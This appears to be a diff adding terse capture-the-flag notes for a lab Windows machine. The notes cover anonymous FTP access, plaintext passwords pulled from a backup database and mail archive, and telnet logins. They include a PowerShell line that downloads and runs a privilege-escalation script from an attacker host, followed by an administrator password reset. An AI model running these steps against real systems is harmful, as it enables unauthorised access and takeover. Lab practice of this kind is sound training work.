@@ -1,0 +1,32 @@
+ftp:
+anonymous:anonymous
+binary
+get Backups/backup.mdb
+get "Engineer/Access Control.zip"
+
+mdb-tables backup.mdb >> tables.txt
+for i in $(cat tables.txt);do mdb-export backup.mdb $i ;d
+one
+
+.. truncated for brevity ..
+id,username,password,Status,last_login,RoleID,Remark
+25,"admin","admin",1,"08/23/18 21:11:47",26,
+27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
+28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
+
+7z x -p access4u@security Access\ Control.zip
+readpst Access\ Control.pst
+less Access\ Control.mbox # contains password
+
+telnet:
+security:4Cc3ssC0ntr0ller
+
+Get System:
+powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.12.12/Invoke-MS16032.ps1')
+
+PS > net user administrator Zeppfasdfasdfkj122
+
+telnet:
+administrator:Zeppfasdfasdfkj122
+
+type root.txt
